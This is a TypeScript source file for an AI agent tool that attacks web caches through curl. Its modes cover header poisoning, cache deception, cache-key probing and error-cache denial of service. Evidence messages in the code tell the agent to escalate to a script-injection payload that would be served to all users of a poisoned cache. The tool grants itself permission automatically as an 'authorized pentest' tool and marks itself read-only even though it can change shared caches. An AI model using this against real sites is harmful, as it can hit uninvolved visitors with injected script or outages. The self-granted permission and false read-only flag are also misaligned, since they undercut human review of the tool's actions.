import { execFile } from 'child_process'
import { promisify } from 'util'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { errorMessage } from '../../utils/errors.js'
import { CACHE_POISONING_TOOL_NAME } from './constants.js'
import { PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const ACTIONS = ['poison_headers', 'cache_deception', 'key_audit', 'dos'] as const

const DEFAULT_UNKEYED_HEADERS = [
  'X-Forwarded-Host',
  'X-Host',
  'X-Forwarded-Server',
  'X-Original-URL',
  'X-Rewrite-URL',
  'X-Forwarded-Scheme',
  'CF-Connecting-IP',
  'True-Client-IP',
  'Forwarded',
  // Additional commonly unkeyed headers (PortSwigger research + community findings)
  'X-Forwarded-Port',       // reflected in redirect URLs / HSTS preload logic
  'X-Forwarded-For',        // often unkeyed, can affect IP-based logic
  'X-Original-URL',         // Nginx: overrides the request path
  'X-Rewrite-URL',          // IIS: overrides the request path
  'X-Custom-IP-Authorization', // reflected in responses from some WAFs
  'X-Arbitrary',             // arbitrary header — some caches pass ALL custom headers
]

const inputSchema = lazySchema(() =>
  z.strictObject({
    url: z.string().describe('Target URL to test'),
    action: z.enum(ACTIONS).describe('poison_headers, cache_deception, key_audit, or dos'),
    headers: z.record(z.string(), z.string()).optional().describe('Additional request headers (cookies, auth)'),
    poison_value: z.string().default('attacker.example.com').describe('Value to inject as unkeyed header'),
    path_suffix: z.string().default('.css').describe('File extension to append for cache deception test'),
    timeout_secs: z.number().int().min(5).max(120).default(30).describe('Per-request timeout in seconds'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

type CacheFinding = {
  vector: string
  header?: string
  payload: string
  status_code: number
  reflected: boolean
  cached_indicator: boolean
  response_preview: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  evidence: string
}

export type Output = {
  url: string
  action: string
  baseline_status: number
  findings: CacheFinding[]
  vulnerable: boolean
  summary: string
  error?: string
}

const outputSchema = lazySchema(() =>
  z.object({
    url: z.string(),
    action: z.string(),
    baseline_status: z.number(),
    findings: z.array(
      z.object({
        vector: z.string(),
        header: z.string().optional(),
        payload: z.string(),
        status_code: z.number(),
        reflected: z.boolean(),
        cached_indicator: z.boolean(),
        response_preview: z.string(),
        severity: z.enum(['critical', 'high', 'medium', 'low', 'info']),
        evidence: z.string(),
      }),
    ),
    vulnerable: z.boolean(),
    summary: z.string(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>

// ── Helpers ───────────────────────────────────────────────────────────────────

async function sendRequest(
  url: string,
  extraHeaders: Record<string, string>,
  timeoutMs: number,
  signal?: AbortSignal,
  body?: string,
): Promise<{ status: number; body: string; headers: string; time_ms: number }> {
  const args: string[] = [
    '-s', '-o', '-', '-D', '-', '-w', '\n%{http_code}',
    '-X', 'GET',
    '--max-time', String(Math.ceil(timeoutMs / 1000)),
    '--connect-timeout', '5',
    '-k',
    '--http1.1',
  ]

  for (const [k, v] of Object.entries(extraHeaders)) {
    args.push('-H', `${k}: ${v}`)
  }

  // Fat GET: an explicit -X GET keeps the method while --data-raw attaches a
  // body. Caches that key only on path+method ignore the body the origin reads.
  if (body !== undefined) {
    args.push('--data-raw', body)
  }

  args.push(url)

  const start = Date.now()
  try {
    const { stdout } = await execFileAsync('/usr/sbin/curl', args, {
      timeout: timeoutMs + 5000,
      maxBuffer: 256 * 1024,
      signal,
    })

    const lines = stdout.split('\n')
    const statusStr = lines[lines.length - 1]?.trim() ?? '0'
    const rest = lines.slice(0, -1).join('\n')

    // Split headers from body (blank line separator)
    const headerEnd = rest.indexOf('\r\n\r\n')
    const responseHeaders = headerEnd >= 0 ? rest.substring(0, headerEnd) : ''
    const body = headerEnd >= 0 ? rest.substring(headerEnd + 4) : rest
    const status = !isNaN(parseInt(statusStr, 10)) ? parseInt(statusStr, 10) : 0

    return { status, body: body.substring(0, 2000), headers: responseHeaders, time_ms: Date.now() - start }
  } catch {
    return { status: 0, body: '', headers: '', time_ms: Date.now() - start }
  }
}

function detectCacheIndicators(responseHeaders: string, body: string): boolean {
  const h = responseHeaders.toLowerCase()
  const b = body.toLowerCase()
  // Age: 0 is NOT a cache hit — only Age > 0 indicates a served-from-cache response.
  const ageMatch = h.match(/\bage:\s*(\d+)/)
  const agePositive = ageMatch ? parseInt(ageMatch[1]!, 10) > 0 : false
  return (
    h.includes('x-cache: hit') ||
    h.includes('x-cache-status: hit') ||
    h.includes('cf-cache-status: hit') ||
    agePositive ||
    h.includes('x-varnish') ||
    b.includes('x-cache-hit') ||
    // Only include 'cached' body check if surrounded by non-alphanumeric chars to avoid false positives
    /\bcached\b/.test(b)
  )
}

// ── Actions ───────────────────────────────────────────────────────────────────

async function runPoisonHeaders(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const timeoutMs = (input.timeout_secs ?? 30) * 1000
  const baseHeaders: Record<string, string> = { ...(input.headers ?? {}) }
  const poisonValue = input.poison_value ?? 'attacker.example.com'

  const baseline = await sendRequest(input.url, baseHeaders, timeoutMs, signal)
  const findings: CacheFinding[] = []

  for (const headerName of DEFAULT_UNKEYED_HEADERS) {
    const reqHeaders = { ...baseHeaders, [headerName]: poisonValue }
    const result = await sendRequest(input.url, reqHeaders, timeoutMs, signal)

    const reflected = result.body.includes(poisonValue) || result.headers.includes(poisonValue)
    const cached = detectCacheIndicators(result.headers, result.body)

    let severity: CacheFinding['severity'] = 'info'
    let evidence = `${headerName}: ${poisonValue} → HTTP ${result.status}`

    if (reflected) {
      severity = 'high'
      evidence += ` — VALUE REFLECTED in response (cache poisoning candidate). Next: inject JavaScript payload as poison_value to test stored XSS via cache.`
    }
    if (reflected && cached) {
      severity = 'critical'
      evidence += ` + CACHED (confirmed cache poisoning). ESCALATE: try poison_value='evil.com"><script>alert(document.domain)</script>' to achieve stored XSS for all users hitting this cached response.`
    }

    findings.push({
      vector: 'unkeyed_header',
      header: headerName,
      payload: `${headerName}: ${poisonValue}`,
      status_code: result.status,
      reflected,
      cached_indicator: cached,
      response_preview: result.body.substring(0, 250),
      severity,
      evidence,
    })

    // Stop early on confirmed critical
    if (severity === 'critical') break
  }

  const vulnerable = findings.some(f => f.severity === 'critical' || f.severity === 'high')
  const hit = findings.find(f => f.reflected)

  return {
    url: input.url,
    action: input.action,
    baseline_status: baseline.status,
    findings,
    vulnerable,
    summary: vulnerable
      ? `Cache poisoning via ${hit?.header}: poison_value reflected${hit?.cached_indicator ? ' and cached' : ''}`
      : `No unkeyed header reflection across ${findings.length} probe(s)`,
  }
}

async function runCacheDeception(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const timeoutMs = (input.timeout_secs ?? 30) * 1000
  const baseHeaders: Record<string, string> = { ...(input.headers ?? {}) }
  const suffix = input.path_suffix ?? '.css'

  // Strip query string for deception paths
  const baseUrl = input.url.split('?')[0]!

  const baseline = await sendRequest(input.url, baseHeaders, timeoutMs, signal)

  const deceptionPaths = [
    `${baseUrl}${suffix}`,
    `${baseUrl}/../fake${suffix}`,
    `${baseUrl}/nonexistent${suffix}`,
    `${baseUrl}?v=1${suffix}`,
  ]

  const findings: CacheFinding[] = []

  for (const path of deceptionPaths) {
    const result = await sendRequest(path, baseHeaders, timeoutMs, signal)
    const cached = detectCacheIndicators(result.headers, result.body)
    const sameContent = result.body.length > 0 && Math.abs(result.body.length - baseline.body.length) < 100

    let severity: CacheFinding['severity'] = 'info'
    let evidence = `${path} → HTTP ${result.status}, ${result.body.length}B`

    if (result.status === 200 && sameContent && cached) {
      severity = 'critical'
      evidence += ` — same content as auth page + CACHED (web cache deception confirmed)`
    } else if (result.status === 200 && sameContent) {
      severity = 'medium'
      evidence += ` — same content as auth page (check if response is cached for other users)`
    }

    findings.push({
      vector: 'path_confusion',
      payload: path,
      status_code: result.status,
      reflected: false,
      cached_indicator: cached,
      response_preview: result.body.substring(0, 250),
      severity,
      evidence,
    })
  }

  const vulnerable = findings.some(f => f.severity === 'critical' || f.severity === 'medium')

  return {
    url: input.url,
    action: input.action,
    baseline_status: baseline.status,
    findings,
    vulnerable,
    summary: vulnerable
      ? `Cache deception candidate: path confusion serves authenticated content at static-looking URL`
      : `No deception indicators across ${findings.length} path(s)`,
  }
}

async function runKeyAudit(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const timeoutMs = (input.timeout_secs ?? 30) * 1000
  const baseHeaders: Record<string, string> = { ...(input.headers ?? {}) }

  const baseline = await sendRequest(input.url, baseHeaders, timeoutMs, signal)
  const findings: CacheFinding[] = []

  // Test query param variations
  const sep = input.url.includes('?') ? '&' : '?'
  const probes: Array<{ label: string; url: string; extraHeaders?: Record<string, string>; body?: string }> = [
    { label: 'query_param_unkeyed', url: `${input.url}${sep}cachebust=clpztest1` },
    { label: 'query_param_variation', url: `${input.url}${sep}v=1` },
    { label: 'case_variation', url: input.url.replace(/https?:\/\/[^/]+/, (m) => m.toLowerCase()) },
    { label: 'accept_encoding', url: input.url, extraHeaders: { 'Accept-Encoding': 'identity' } },
    { label: 'vary_accept', url: input.url, extraHeaders: { Accept: 'text/html,application/xhtml+xml' } },
    { label: 'vary_accept_json', url: input.url, extraHeaders: { Accept: 'application/json' } },
    // Fat GET: body the origin may parse but the cache key ignores.
    { label: 'fat_get_body', url: input.url, body: 'clpzfatget=clpztest1' },
    // Parameter cloaking: duplicate + semicolon-delimited params parsed
    // differently by cache vs origin (e.g. ?x=safe&x=evil, ?x=1;evil=2).
    { label: 'param_cloak_duplicate', url: `${input.url}${sep}clpzcloak=safe&clpzcloak=clpzevil1` },
    { label: 'param_cloak_semicolon', url: `${input.url}${sep}clpzcloak=1;clpzevil2=1` },
  ]

  for (const probe of probes) {
    const reqHeaders = { ...baseHeaders, ...(probe.extraHeaders ?? {}) }
    const result = await sendRequest(probe.url, reqHeaders, timeoutMs, signal, probe.body)
    const cached = detectCacheIndicators(result.headers, result.body)
    const sameContent = Math.abs(result.body.length - baseline.body.length) < 50

    let severity: CacheFinding['severity'] = 'info'
    let evidence = `${probe.label}: HTTP ${result.status}, ${result.body.length}B, cached=${cached}`

    if (!sameContent && result.status === 200 && cached) {
      severity = 'medium'
      evidence += ` — different content + cached; parameter may be unkeyed`
    }

    findings.push({
      vector: probe.label,
      payload: probe.url,
      status_code: result.status,
      reflected: false,
      cached_indicator: cached,
      response_preview: result.body.substring(0, 150),
      severity,
      evidence,
    })
  }

  const vulnerable = findings.some(f => f.severity !== 'info')

  return {
    url: input.url,
    action: input.action,
    baseline_status: baseline.status,
    findings,
    vulnerable,
    summary: vulnerable
      ? `Cache key anomalies detected — review findings for unkeyed inputs`
      : `No obvious cache key anomalies across ${findings.length} probe(s)`,
  }
}

async function runDos(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const timeoutMs = (input.timeout_secs ?? 30) * 1000
  const baseHeaders: Record<string, string> = { ...(input.headers ?? {}) }

  const baseline = await sendRequest(input.url, baseHeaders, timeoutMs, signal)
  const findings: CacheFinding[] = []

  // Test 404 caching and error caching
  const sep = input.url.includes('?') ? '&' : '?'
  const probes = [
    { label: 'error_404_cached', url: `${input.url}/nonexistent_${Date.now()}` },
    { label: 'large_response_candidate', url: `${input.url}${sep}large=1` },
    { label: 'error_with_range', url: input.url, extraHeaders: { Range: 'bytes=0-999999999' } as Record<string,string> },
  ]

  for (const probe of probes) {
    const reqHeaders = { ...baseHeaders, ...(probe.extraHeaders ?? {}) }
    const result = await sendRequest(probe.url, reqHeaders, timeoutMs, signal)
    const cached = detectCacheIndicators(result.headers, result.body)

    let severity: CacheFinding['severity'] = 'info'
    let evidence = `${probe.label}: HTTP ${result.status}, cached=${cached}`

    if ((result.status === 404 || result.status >= 500) && cached) {
      severity = 'medium'
      evidence += ` — error response cached; DoS by poisoning cache with error`
    }

    findings.push({
      vector: probe.label,
      payload: probe.url,
      status_code: result.status,
      reflected: false,
      cached_indicator: cached,
      response_preview: result.body.substring(0, 200),
      severity,
      evidence,
    })
  }

  const vulnerable = findings.some(f => f.severity !== 'info')

  return {
    url: input.url,
    action: input.action,
    baseline_status: baseline.status,
    findings,
    vulnerable,
    summary: vulnerable
      ? `Cache DoS candidate: error/large responses may be cached for all users`
      : `No cache DoS indicators found`,
  }
}

// ── Tool ──────────────────────────────────────────────────────────────────────

export const CachePoisoningTool = buildTool({
  name: CACHE_POISONING_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  maxResultSizeChars: 40_000,
  searchHint: 'cache poisoning deception web cache unkeyed header X-Forwarded-Host CDN',
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `${i.action ?? 'poison_headers'}: ${i.url ?? ''}`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `${CACHE_POISONING_TOOL_NAME}:${i.action}` : CACHE_POISONING_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `cache-poisoning ${i?.action ?? 'poison_headers'} ${i?.url ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `CachePoisoning ${i?.action ?? 'poison_headers'}: ${i?.url ?? ''}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `CachePoisoning ${i.action ?? 'poison_headers'}: ${i.url ?? ''}`
  },
  renderToolResultMessage,
  async call(input, context) {
    const signal = context.abortController.signal
    try {
      let result: Output
      switch (input.action) {
        case 'poison_headers':
          result = await runPoisonHeaders(input, signal)
          break
        case 'cache_deception':
          result = await runCacheDeception(input, signal)
          break
        case 'key_audit':
          result = await runKeyAudit(input, signal)
          break
        case 'dos':
          result = await runDos(input, signal)
          break
        default:
          result = {
            url: input.url,
            action: input.action,
            baseline_status: 0,
            findings: [],
            vulnerable: false,
            summary: 'Unknown action',
            error: 'Unknown action',
          }
      }
      return { data: result }
    } catch (err: unknown) {
      logForDebugging(`CachePoisoningTool error: ${errorMessage(err)}`)
      return {
        data: {
          url: input.url,
          action: input.action,
          baseline_status: 0,
          findings: [],
          vulnerable: false,
          summary: 'Tool execution failed',
          error: errorMessage(err),
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`CachePoisoning: ${content.action} → ${content.url}`, '']

    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }

    lines.push(content.vulnerable ? 'VULNERABLE' : 'No obvious vulnerability')
    lines.push(`Baseline: HTTP ${content.baseline_status}`)
    lines.push(`Summary: ${content.summary}`)
    lines.push('')

    for (const f of content.findings.filter(f => f.severity !== 'info')) {
      lines.push(`${f.vector}: ${f.severity.toUpperCase()} | HTTP ${f.status_code}`)
      lines.push(`  ${f.evidence}`)
      if (f.header) lines.push(`  Header: ${f.header}`)
      if (f.response_preview) lines.push(`  Preview: ${f.response_preview.substring(0, 150)}`)
      lines.push('')
    }

    const infoCount = content.findings.filter(f => f.severity === 'info').length
    if (infoCount > 0) {
      lines.push(`${infoCount} probe(s): no indicators`)
    }

    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)

// Exported for testing only
export const __test = { detectCacheIndicators }
